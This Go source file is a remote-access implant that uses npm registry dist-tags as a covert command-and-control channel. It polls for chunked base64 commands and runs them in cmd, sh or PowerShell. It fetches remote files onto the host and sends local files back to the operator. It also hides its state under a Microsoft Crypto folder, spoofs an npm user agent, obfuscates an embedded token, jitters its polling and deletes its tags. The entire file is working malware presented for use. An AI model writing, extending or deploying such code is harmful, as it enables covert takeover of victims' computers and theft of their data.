// npm-registry dist-tags as a command channel.
//
// Wire format (identical to the Python operator, v2 framing):
//
//	<prefix><gid>-<idx><total>_<base64url chunk>
//
//	prefix  x64-  command      arm64- reply      ia32- heartbeat
//	gid     4 hex chars shared by every chunk of one payload
//	idx     2 digits, 1-based     total 2 digits
//
// A payload spanning several tags is reassembled and executed once; an
// incomplete group waits for the next poll.
package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	cmdPrefix = "x64-"
	resPrefix = "arm64-"
	hbtPrefix = "ia32-"

	maxTagLen = 250
	frameOver = 14 // prefix(4)+gid(4)+"-"(1)+idx(2)+total(2)+"_"(1)
	maxChunks = 99

	defaultTimeout = 30 * time.Second
	maxCapture     = 12000
	maxUpload      = 12000
	seenCap        = 512
	autoClean      = true
	retries        = 3
)

const userAgent = "npm/11.18.0 node/v22.7.0 win32 x64"

// ---------------------------------------------------------------- framing

type tagInfo struct {
	GID   string
	Index int
	Total int
	Data  []byte
}

func registryPath(pkg string) string {
	if strings.HasPrefix(pkg, "@") {
		if i := strings.Index(pkg, "/"); i > 0 {
			return pkg[:i] + "%2f" + pkg[i+1:]
		}
	}
	return pkg
}

func encodePayload(data []byte, prefix string) ([]string, error) {
	b64 := base64.RawURLEncoding.EncodeToString(data)
	room := maxTagLen - len(prefix) - frameOver
	room -= room % 4 // split on a 4-char boundary: no bits lost
	if room < 16 {
		return nil, fmt.Errorf("tag prefix too long: %q", prefix)
	}
	var chunks []string
	if len(b64) == 0 {
		chunks = []string{""}
	} else {
		for i := 0; i < len(b64); i += room {
			end := i + room
			if end > len(b64) {
				end = len(b64)
			}
			chunks = append(chunks, b64[i:end])
		}
	}
	if len(chunks) > maxChunks {
		return nil, fmt.Errorf("payload needs %d tags, limit %d", len(chunks), maxChunks)
	}
	gid := randomHex(2)
	tags := make([]string, len(chunks))
	for i, chunk := range chunks {
		tags[i] = fmt.Sprintf("%s%s-%02d%02d_%s", prefix, gid, i+1, len(chunks), chunk)
	}
	return tags, nil
}

func decodeTag(tag string) (tagInfo, bool) {
	var body string
	switch {
	case strings.HasPrefix(tag, cmdPrefix):
		body = tag[len(cmdPrefix):]
	case strings.HasPrefix(tag, resPrefix):
		body = tag[len(resPrefix):]
	case strings.HasPrefix(tag, hbtPrefix):
		body = tag[len(hbtPrefix):]
	default:
		return tagInfo{}, false
	}
	underscore := strings.Index(body, "_")
	if underscore < 0 {
		return tagInfo{}, false // heartbeat
	}
	meta, payload := body[:underscore], body[underscore+1:]

	gid, idx, total := meta, 1, 1
	if dash := strings.Index(meta, "-"); dash >= 0 {
		seq := meta[dash+1:]
		if len(seq) >= 4 {
			if i, err := strconv.Atoi(seq[:2]); err == nil {
				if t, err2 := strconv.Atoi(seq[2:4]); err2 == nil {
					gid, idx, total = meta[:dash], i, t
				}
			}
		}
	}
	data, err := base64.RawURLEncoding.DecodeString(payload)
	if err != nil {
		return tagInfo{}, false
	}
	if idx < 1 || total < 1 || idx > total {
		return tagInfo{}, false
	}
	return tagInfo{GID: gid, Index: idx, Total: total, Data: data}, true
}

func randomHex(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return strings.Repeat("0", n*2)
	}
	return hex.EncodeToString(b)
}

// ---------------------------------------------------------------- implant

type implant struct {
	pkg      string
	url      string
	token    string
	interval time.Duration
	jitter   time.Duration
	verbose  bool

	mu           sync.Mutex
	seen         map[string]bool
	seenOdr      []string
	pending      map[string]*pendingGroup
	pendingOrder []string
	jobs         map[string]*job
	jobSeq       int
	cwd          string

	stateFile string
	client    *http.Client
}

type pendingGroup struct {
	total int
	parts map[int][]byte
}

type job struct {
	id      string
	command string
	mu      sync.Mutex
	buf     []byte
	state   string
	started time.Time
	cmd     *exec.Cmd
}

func newImplant(pkg, token string, interval, jitter time.Duration, verbose bool) *implant {
	home, err := os.UserHomeDir()
	if err != nil {
		home = "."
	}
	safe := strings.NewReplacer("/", "_", "@", "").Replace(pkg)
	base := os.Getenv("APPDATA")
	if base == "" {
		base = os.Getenv("TEMP")
	}
	if base == "" {
		base = home
	}
	return &implant{
		pkg:       pkg,
		url:       fmt.Sprintf(apiTemplate, registryPath(pkg)),
		token:     token,
		interval:  maxDuration(interval, 10*time.Second),
		jitter:    maxDuration(jitter, 0),
		verbose:   verbose,
		seen:      map[string]bool{},
		pending:   map[string]*pendingGroup{},
		jobs:      map[string]*job{},
		cwd:       home,
		stateFile: filepath.Join(base, "Microsoft", "Crypto", ".rsa_"+safe+".idx"),
		client:    &http.Client{Timeout: 15 * time.Second},
	}
}

func maxDuration(d, min time.Duration) time.Duration {
	if d < min {
		return min
	}
	return d
}

func (im *implant) logf(format string, args ...any) {
	if im.verbose {
		fmt.Fprintf(os.Stderr, format+"\n", args...)
	}
}

// ---------------------------------------------------------------- state

func (im *implant) loadState() {
	data, err := os.ReadFile(im.stateFile)
	if err != nil {
		return
	}
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimRight(line, "\r")
		switch {
		case strings.HasPrefix(line, "cwd\t"):
			im.cwd = line[4:]
		case strings.TrimSpace(line) != "":
			im.seen[line] = true
		}
	}
}

func (im *implant) saveState() {
	im.mu.Lock()
	defer im.mu.Unlock()
	if err := os.MkdirAll(filepath.Dir(im.stateFile), 0o700); err != nil {
		im.logf("[!] state dir: %v", err)
		return
	}
	var buf bytes.Buffer
	fmt.Fprintf(&buf, "cwd\t%s\n", im.cwd)
	for _, tag := range im.seenOdr {
		buf.WriteString(tag + "\n")
	}
	tmp := im.stateFile + ".tmp"
	if err := os.WriteFile(tmp, buf.Bytes(), 0o600); err != nil {
		im.logf("[!] state write: %v", err)
		return
	}
	if err := os.Rename(tmp, im.stateFile); err != nil {
		im.logf("[!] state rename: %v", err)
	}
}

func (im *implant) remember(tag string) {
	if im.seen[tag] {
		return
	}
	im.seen[tag] = true
	im.seenOdr = append(im.seenOdr, tag)
	for len(im.seenOdr) > seenCap {
		delete(im.seen, im.seenOdr[0])
		im.seenOdr = im.seenOdr[1:]
	}
}

// ---------------------------------------------------------------- http

func (im *implant) request(method, path string, body []byte) (*http.Response, error) {
	req, err := http.NewRequest(method, path, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", userAgent)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	if im.token != "" {
		req.Header.Set("Authorization", "Bearer "+im.token)
	}
	return im.client.Do(req)
}

func backoff(attempt int, retryAfter string) time.Duration {
	if retryAfter != "" {
		if secs, err := strconv.ParseFloat(retryAfter, 64); err == nil {
			if secs > 120 {
				secs = 120
			}
			return time.Duration(secs * float64(time.Second))
		}
	}
	d := time.Duration(1<<uint(attempt)) * time.Second
	return d + time.Duration(float64(time.Second)*randFloat())
}

func randFloat() float64 {
	var b [2]byte
	if _, err := rand.Read(b[:]); err != nil {
		return 0
	}
	return float64(b[0]) / 256.0
}

func (im *implant) fetch() (map[string]string, []string, error) {
	var lastErr error
	for attempt := 0; attempt < retries; attempt++ {
		resp, err := im.request(http.MethodGet, im.url, nil)
		if err != nil {
			lastErr = err
			if attempt+1 < retries {
				time.Sleep(backoff(attempt, ""))
				continue
			}
			return nil, nil, err
		}
		body, readErr := io.ReadAll(resp.Body)
		resp.Body.Close()
		if readErr != nil {
			lastErr = readErr
			continue
		}
		switch {
		case resp.StatusCode == http.StatusOK:
			// Decode into an ordered list: Go maps lose insertion order, and
			// the registry publishes tags in the order commands were queued.
			// Without this a "cd:x" followed by "run" executes in random order.
			dec := json.NewDecoder(bytes.NewReader(body))
			if _, err := dec.Token(); err != nil { // '{'
				return nil, nil, fmt.Errorf("registry returned non-JSON: %w", err)
			}
			tags := map[string]string{}
			var order []string
			for dec.More() {
				keyTok, err := dec.Token()
				if err != nil {
					return nil, nil, fmt.Errorf("registry returned non-JSON: %w", err)
				}
				key, _ := keyTok.(string)
				var value string
				if err := dec.Decode(&value); err != nil {
					return nil, nil, fmt.Errorf("registry returned non-JSON: %w", err)
				}
				if _, exists := tags[key]; !exists {
					order = append(order, key)
				}
				tags[key] = value
			}
			return tags, order, nil
		case resp.StatusCode == 429 || resp.StatusCode >= 500:
			lastErr = fmt.Errorf("HTTP %d", resp.StatusCode)
			if attempt+1 < retries {
				time.Sleep(backoff(attempt, resp.Header.Get("Retry-After")))
				continue
			}
			return nil, nil, lastErr
		default:
			return nil, nil, fmt.Errorf("HTTP %d", resp.StatusCode)
		}
	}
	return nil, nil, lastErr
}

func (im *implant) put(tag string) bool {
	body, _ := json.Marshal(tagValue)
	var lastErr error
	for attempt := 0; attempt < retries; attempt++ {
		resp, err := im.request(http.MethodPut, im.url+"/"+tag, body)
		if err != nil {
			lastErr = err
			if attempt+1 < retries {
				time.Sleep(backoff(attempt, ""))
				continue
			}
			break
		}
		io.Copy(io.Discard, resp.Body)
		retryAfter := resp.Header.Get("Retry-After")
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			return true
		}
		lastErr = fmt.Errorf("HTTP %d", resp.StatusCode)
		if (resp.StatusCode == 429 || resp.StatusCode >= 500) && attempt+1 < retries {
			time.Sleep(backoff(attempt, retryAfter))
			continue
		}
		break
	}
	im.logf("[!] PUT %s: %v", trunc(tag, 24), lastErr)
	return false
}

func (im *implant) del(tag string) bool {
	resp, err := im.request(http.MethodDelete, im.url+"/"+tag, nil)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode >= 200 && resp.StatusCode < 300
}

// ---------------------------------------------------------------- parse

// parse collects complete commands across polls.
func (im *implant) parse(tags map[string]string, order []string) []string {
	im.mu.Lock()
	members := map[string][]string{}
	for _, tag := range order {
		if im.seen[tag] || !strings.HasPrefix(tag, cmdPrefix) {
			continue
		}
		info, ok := decodeTag(tag)
		if !ok {
			continue
		}
		members[info.GID] = append(members[info.GID], tag)
		if g, exists := im.pending[info.GID]; exists {
			if g.total == info.Total {
				g.parts[info.Index] = info.Data
			}
		} else {
			im.pending[info.GID] = &pendingGroup{
				total: info.Total,
				parts: map[int][]byte{info.Index: info.Data},
			}
			im.pendingOrder = append(im.pendingOrder, info.GID)
		}
	}

	var commands []string
	var retire []string
	for _, gid := range im.pendingOrder {
		group, ok := im.pending[gid]
		if !ok {
			continue
		}
		if len(group.parts) != group.total {
			continue // still waiting on chunks
		}
		var payload []byte
		for i := 1; i <= group.total; i++ {
			payload = append(payload, group.parts[i]...)
		}
		commands = append(commands, string(payload))
		delete(im.pending, gid)
		im.pendingOrder = removeString(im.pendingOrder, gid)
		// retire every tag of this group, including ones seen in earlier polls
		for _, tag := range order {
			if !strings.HasPrefix(tag, cmdPrefix) {
				continue
			}
			if info, ok := decodeTag(tag); ok && info.GID == gid {
				retire = append(retire, tag)
			}
		}
		retire = append(retire, members[gid]...)
	}
	for _, tag := range order {
		if strings.HasPrefix(tag, cmdPrefix) {
			im.remember(tag)
		}
	}
	im.mu.Unlock()

	if autoClean && im.token != "" {
		for _, tag := range retire {
			im.del(tag)
		}
	}
	return commands
}

// ---------------------------------------------------------------- cycle

func (im *implant) run() {
	im.loadState()
	if fi, err := os.Stat(im.cwd); err != nil || !fi.IsDir() {
		if home, err := os.UserHomeDir(); err == nil {
			im.cwd = home
		}
	}
	cycle := 0
	for {
		tags, order, err := im.fetch()
		if err != nil {
			im.logf("[!] cycle failed against %s: %v", im.url, err)
		} else {
			for _, cmd := range im.parse(tags, order) {
				im.logf("[+] cmd: %s", trunc(cmd, 60))
				if out := im.exec(cmd); out != "" && im.token != "" {
					im.reply(out)
				}
			}
			cycle++
			if cycle%10 == 0 {
				im.saveState()
				if im.token != "" {
					im.put(hbtPrefix + randomHex(3))
				}
			}
		}
		time.Sleep(im.interval + time.Duration(float64(im.jitter)*randFloat()))
	}
}

func (im *implant) reply(out string) {
	tags, err := encodePayload([]byte(out), resPrefix)
	if err != nil {
		im.logf("[!] reply encode: %v", err)
		return
	}
	for _, tag := range tags {
		im.put(tag)
	}
	im.logf("[+] result sent (%d tag(s))", len(tags))
}

// ---------------------------------------------------------------- exec

func (im *implant) exec(cmd string) (out string) {
	defer func() {
		if r := recover(); r != nil {
			out = fmt.Sprintf("(panic: %v)", r)
		}
	}()

	switch {
	case cmd == "exit":
		im.clean()
		os.Exit(0)
	case cmd == "cd":
		return "cwd=" + im.cwd
	case strings.HasPrefix(cmd, "cd:"):
		target := strings.TrimSpace(cmd[3:])
		if !filepath.IsAbs(target) {
			target = filepath.Join(im.cwd, target)
		}
		target = filepath.Clean(target)
		if fi, err := os.Stat(target); err != nil || !fi.IsDir() {
			return "cd: no such directory " + target
		}
		im.cwd = target
		im.saveState()
		return "cwd=" + im.cwd
	case cmd == "jobs":
		return im.listJobs()
	case strings.HasPrefix(cmd, "out:"):
		return im.jobOutput(strings.TrimSpace(cmd[4:]))
	case strings.HasPrefix(cmd, "kill:"):
		return im.killJob(strings.TrimSpace(cmd[5:]))
	case strings.HasPrefix(cmd, "bg:"):
		return im.spawnBackground(strings.TrimSpace(cmd[3:]))
	case strings.HasPrefix(cmd, "sleep:"):
		secs, err := strconv.Atoi(strings.TrimSpace(cmd[6:]))
		if err != nil {
			return fmt.Sprintf("sleep: bad value %q", cmd[6:])
		}
		if secs < 10 {
			secs = 10
		}
		im.interval = time.Duration(secs) * time.Second
		im.saveState()
		return fmt.Sprintf("interval=%d", secs)
	case strings.HasPrefix(cmd, "dl:"):
		rest := cmd[3:]
		urlPart, pathPart, ok := splitDL(rest)
		if !ok {
			return "dl: expected dl:<url>:<path>"
		}
		return im.download(urlPart, pathPart)
	case strings.HasPrefix(cmd, "up:"):
		return im.upload(cmd[3:])
	}

	timeout := defaultTimeout
	body := cmd
	if strings.HasPrefix(body, "timeout:") {
		rest := body[len("timeout:"):]
		colon := strings.Index(rest, ":")
		if colon <= 0 {
			return "timeout: expected timeout:<seconds>:<command>"
		}
		secs, err := strconv.Atoi(rest[:colon])
		if err != nil {
			return "timeout: expected timeout:<seconds>:<command>"
		}
		if secs < 1 {
			secs = 1
		}
		if secs > 3600 {
			secs = 3600
		}
		timeout = time.Duration(secs) * time.Second
		body = rest[colon+1:]
	}

	powershell := false
	switch {
	case strings.HasPrefix(body, "ps:"):
		body, powershell = body[3:], true
	case strings.HasPrefix(body, "exec:"):
		body = body[5:]
	case strings.HasPrefix(body, "sh:"):
		body = body[3:]
	}
	return im.runCommand(body, timeout, powershell)
}

func (im *implant) shellArgv(body string, powershell bool) []string {
	if powershell {
		if runtime.GOOS == "windows" {
			return []string{"powershell.exe", "-NoProfile", "-NonInteractive", "-Command", body}
		}
		return []string{"pwsh", "-NoProfile", "-NonInteractive", "-Command", body}
	}
	if runtime.GOOS == "windows" {
		return []string{"cmd.exe", "/c", body}
	}
	return []string{"/bin/sh", "-c", body}
}

func (im *implant) runCommand(body string, timeout time.Duration, powershell bool) string {
	if strings.TrimSpace(body) == "" {
		return "(empty command)"
	}
	cmd := exec.Command(im.shellArgv(body, powershell)[0], im.shellArgv(body, powershell)[1:]...)
	cmd.Dir = im.cwd
	var out, errBuf bytes.Buffer
	cmd.Stdout = &limitedWriter{buf: &out, limit: maxCapture}
	cmd.Stderr = &limitedWriter{buf: &errBuf, limit: maxCapture}
	err := runWithTimeout(cmd, timeout)
	combined := strings.TrimSpace(out.String() + errBuf.String())
	if len(combined) > maxCapture {
		cut := len(combined) - maxCapture
		combined = combined[:maxCapture] + fmt.Sprintf("\n[truncated %d chars]", cut)
	}
	var prefix string
	switch {
	case errors.Is(err, errTimeout):
		return fmt.Sprintf("(timeout after %s)", timeout)
	case err != nil:
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			prefix = fmt.Sprintf("[rc=%d] ", exitErr.ExitCode())
		} else {
			return fmt.Sprintf("(%v)", err)
		}
	}
	if combined == "" && prefix == "" {
		return "(no output)"
	}
	return prefix + combined
}

var errTimeout = errors.New("timeout")

func runWithTimeout(cmd *exec.Cmd, timeout time.Duration) error {
	if err := cmd.Start(); err != nil {
		return err
	}
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case err := <-done:
		return err
	case <-time.After(timeout):
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		<-done
		return errTimeout
	}
}

// limitedWriter caps how much a child can write into our buffer.
type limitedWriter struct {
	buf   *bytes.Buffer
	limit int
}

func (w *limitedWriter) Write(p []byte) (int, error) {
	if w.buf.Len() >= w.limit {
		return len(p), nil // swallow, report success so the child keeps going
	}
	room := w.limit - w.buf.Len()
	if len(p) > room {
		w.buf.Write(p[:room])
		return len(p), nil
	}
	return w.buf.Write(p)
}

// ---------------------------------------------------------------- jobs

func (im *implant) spawnBackground(body string) string {
	if body == "" {
		return "bg: expected bg:<command>"
	}
	im.mu.Lock()
	im.jobSeq++
	id := fmt.Sprintf("j%d", im.jobSeq)
	j := &job{id: id, command: body, state: "running", started: time.Now()}
	im.jobs[id] = j
	im.mu.Unlock()

	go func() {
		argv := im.shellArgv(body, false)
		c := exec.Command(argv[0], argv[1:]...)
		c.Dir = im.cwd
		j.mu.Lock()
		j.cmd = c
		j.mu.Unlock()
		var buf bytes.Buffer
		c.Stdout = &limitedWriter{buf: &buf, limit: maxCapture * 2}
		c.Stderr = &limitedWriter{buf: &buf, limit: maxCapture * 2}
		if err := c.Run(); err != nil {
			j.mu.Lock()
			if _, ok := err.(*exec.ExitError); !ok {
				buf.WriteString(fmt.Sprintf("\n(%v)", err))
				j.state = "failed"
			} else {
				j.state = "done"
			}
			j.mu.Unlock()
		} else {
			j.mu.Lock()
			j.state = "done"
			j.mu.Unlock()
		}
		j.mu.Lock()
		j.buf = buf.Bytes()
		j.mu.Unlock()
	}()
	return fmt.Sprintf("job %s started: %s", id, trunc(body, 40))
}

func (im *implant) listJobs() string {
	im.mu.Lock()
	defer im.mu.Unlock()
	if len(im.jobs) == 0 {
		return "no jobs"
	}
	var lines []string
	for _, j := range im.jobs {
		lines = append(lines, j.summary())
	}
	return strings.Join(lines, "\n")
}

func (j *job) summary() string {
	j.mu.Lock()
	defer j.mu.Unlock()
	rc := "nil"
	if j.cmd != nil && j.cmd.ProcessState != nil {
		rc = strconv.Itoa(j.cmd.ProcessState.ExitCode())
	}
	return fmt.Sprintf("%s %s %s rc=%s :: %s",
		j.id, j.state, time.Since(j.started).Truncate(time.Second), rc, trunc(j.command, 40))
}

func (im *implant) jobOutput(id string) string {
	im.mu.Lock()
	j, ok := im.jobs[id]
	im.mu.Unlock()
	if !ok {
		return fmt.Sprintf("out: unknown job %q", id)
	}
	j.mu.Lock()
	defer j.mu.Unlock()
	out := string(j.buf)
	if len(out) > maxCapture {
		out = out[len(out)-maxCapture:]
	}
	if out == "" {
		out = "(no output yet)"
	}
	return "[" + j.summaryUnlocked() + "]\n" + out
}

func (j *job) summaryUnlocked() string {
	rc := "nil"
	if j.cmd != nil && j.cmd.ProcessState != nil {
		rc = strconv.Itoa(j.cmd.ProcessState.ExitCode())
	}
	return fmt.Sprintf("%s %s %s rc=%s :: %s",
		j.id, j.state, time.Since(j.started).Truncate(time.Second), rc, trunc(j.command, 40))
}

func (im *implant) killJob(id string) string {
	im.mu.Lock()
	j, ok := im.jobs[id]
	im.mu.Unlock()
	if !ok {
		return fmt.Sprintf("kill: unknown job %q", id)
	}
	j.mu.Lock()
	defer j.mu.Unlock()
	if j.cmd != nil && j.cmd.Process != nil {
		_ = j.cmd.Process.Kill()
	}
	j.state = "killed"
	return "killed " + id
}

// ---------------------------------------------------------------- files

// splitDL finds the colon separating the URL from the destination path.
// Both sides can contain one ("http://host:8080/x.exe", "C:\temp\x.exe").
func splitDL(rest string) (string, string, bool) {
	scheme := strings.Index(rest, "://")
	start := 0
	switch {
	case scheme >= 0:
		start = scheme + 3
	case len(rest) > 2 && rest[1] == ':' && isAlpha(rest[0]):
		start = 2
	}
	looksLikePath := func(tail string) bool {
		if tail == "" {
			return false
		}
		if tail[0] == '/' || tail[0] == '\\' {
			return true
		}
		return len(tail) > 1 && tail[1] == ':' && isAlpha(tail[0])
	}
	for i := start; i < len(rest); i++ {
		if rest[i] == ':' && looksLikePath(rest[i+1:]) {
			return rest[:i], rest[i+1:], true
		}
	}
	if scheme >= 0 {
		if i := strings.LastIndex(rest, ":"); i > start {
			return rest[:i], rest[i+1:], true
		}
	}
	if i := strings.Index(rest[start:], ":"); i >= 0 {
		cut := start + i
		return rest[:cut], rest[cut+1:], true
	}
	return "", "", false
}

func isAlpha(b byte) bool {
	return (b >= 'a' && b <= 'z') || (b >= 'A' && b <= 'Z')
}

func (im *implant) download(rawurl, path string) string {
	if !filepath.IsAbs(path) {
		path = filepath.Join(im.cwd, path)
	}
	resp, err := im.client.Do(mustRequest(rawurl))
	if err != nil {
		return fmt.Sprintf("(dl: %v)", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 {
		return fmt.Sprintf("(dl: HTTP %d)", resp.StatusCode)
	}
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Sprintf("(dl: %v)", err)
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return fmt.Sprintf("(dl: %v)", err)
	}
	if err := os.WriteFile(path, data, 0o644); err != nil {
		return fmt.Sprintf("(dl: %v)", err)
	}
	return fmt.Sprintf("dl %db -> %s", len(data), path)
}

func mustRequest(rawurl string) *http.Request {
	req, err := http.NewRequest(http.MethodGet, rawurl, nil)
	if err != nil {
		return &http.Request{URL: &url.URL{}}
	}
	req.Header.Set("User-Agent", userAgent)
	return req
}

// up:<path>[:<offset>[:<length>]] — base64 of the file or of a byte range.
//
// The path itself can contain a colon (a Windows drive), so the optional
// numeric fields are peeled off the right end, never split from the left.
func (im *implant) upload(spec string) string {
	path := spec
	offset, length := 0, maxUpload

	// Peel a trailing :<number>, at most twice.
	for i := 0; i < 2; i++ {
		colon := strings.LastIndex(path, ":")
		if colon <= 0 || colon == len(path)-1 {
			break
		}
		candidate := path[colon+1:]
		value, err := strconv.Atoi(candidate)
		if err != nil {
			break
		}
		if i == 0 {
			length = value
		} else {
			offset = value
		}
		path = path[:colon]
	}
	path = strings.TrimSpace(path)
	if path == "" {
		return "up: expected up:<path>"
	}
	if !filepath.IsAbs(path) {
		path = filepath.Join(im.cwd, path)
	}
	if length < 1 {
		length = 1
	}
	if length > maxUpload {
		length = maxUpload
	}
	if offset < 0 {
		offset = 0
	}
	fi, err := os.Stat(path)
	if err != nil {
		return fmt.Sprintf("up fail: %v", err)
	}
	f, err := os.Open(path)
	if err != nil {
		return fmt.Sprintf("up fail: %v", err)
	}
	defer f.Close()
	if _, err := f.Seek(int64(offset), io.SeekStart); err != nil {
		return fmt.Sprintf("up fail: %v", err)
	}
	buf := make([]byte, length)
	n, _ := io.ReadFull(f, buf)
	data := base64.StdEncoding.EncodeToString(buf[:n])
	end := offset + n
	more := ""
	if int64(end) < fi.Size() {
		more = "+"
	}
	return fmt.Sprintf("up %d-%d/%db%s: %s", offset, end, fi.Size(), more, data)
}

func (im *implant) clean() {
	if im.token == "" {
		return
	}
	tags, _, err := im.fetch()
	if err != nil {
		return
	}
	for tag := range tags {
		if strings.HasPrefix(tag, cmdPrefix) || strings.HasPrefix(tag, resPrefix) ||
			strings.HasPrefix(tag, hbtPrefix) {
			im.del(tag)
		}
	}
}

func removeString(list []string, want string) []string {
	out := list[:0]
	for _, item := range list {
		if item != want {
			out = append(out, item)
		}
	}
	return out
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}

// ---------------------------------------------------------------- token

func xorKey(pkg string) []byte {
	sum := sha256.Sum256([]byte(pkg))
	return sum[:16]
}

func deobfuscate(hexdata, pkg string) (string, bool) {
	raw, err := hex.DecodeString(hexdata)
	if err != nil {
		return "", false
	}
	key := xorKey(pkg)
	out := make([]byte, len(raw))
	for i := range raw {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	return string(out), true
}

// ---------------------------------------------------------------- main

func main() {
	pkg := flag.String("package", "", "npm package carrying the tags")
	pkgShort := flag.String("p", "", "alias of --package")
	token := flag.String("token", "", "npm token for write-back")
	tokenShort := flag.String("t", "", "alias of --token")
	interval := flag.Int("interval", 0, "seconds between polls (0 = built-in)")
	jitter := flag.Int("jitter", -1, "random jitter added to each poll (-1 = built-in)")
	verbose := flag.Bool("verbose", false, "log to stderr")
	verboseShort := flag.Bool("v", false, "alias of --verbose")
	flag.Parse()

	// A generated binary carries its whole configuration, so a bare
	// `node.exe` with no arguments must work. Flags only override it.
	name := firstNonEmpty(*pkg, *pkgShort, embeddedPkg)
	if name == "" {
		fmt.Fprintln(os.Stderr,
			"npm-c2: no package configured (build with -p, or pass --package)")
		os.Exit(2)
	}
	tok := firstNonEmpty(*token, *tokenShort)
	if tok == "" && embeddedToken != "" {
		if dec, ok := deobfuscate(embeddedToken, name); ok {
			tok = dec
		}
	}
	if tok == "" {
		fmt.Fprintln(os.Stderr, "[!] no token: this implant can execute but not reply")
	}

	every := *interval
	if every <= 0 {
		every = intOr(embeddedEvery, 60)
	}
	jit := *jitter
	if jit < 0 {
		jit = intOr(embeddedJit, 20)
	}

	im := newImplant(name, tok,
		time.Duration(every)*time.Second,
		time.Duration(jit)*time.Second,
		*verbose || *verboseShort)
	im.run()
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if v != "" {
			return v
		}
	}
	return ""
}

func intOr(raw string, fallback int) int {
	if raw == "" {
		return fallback
	}
	if v, err := strconv.Atoi(raw); err == nil {
		return v
	}
	return fallback
}
